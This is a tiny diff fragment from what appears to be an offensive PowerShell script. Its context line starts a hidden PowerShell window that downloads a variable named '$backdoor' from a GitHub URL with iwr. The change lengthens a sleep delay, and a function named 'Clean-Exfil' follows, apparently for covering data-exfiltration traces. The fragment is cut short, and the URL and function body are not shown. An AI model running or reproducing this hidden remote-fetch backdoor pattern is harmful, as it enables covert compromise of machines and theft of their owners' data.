@@ -16,7 +16,7 @@ start powershell -argumentlist '-windowstyle hidden $backdoor = iwr https://gith
 
 
 
-start-sleep 10
+start-sleep 60
 
 function Clean-Exfil { 
 
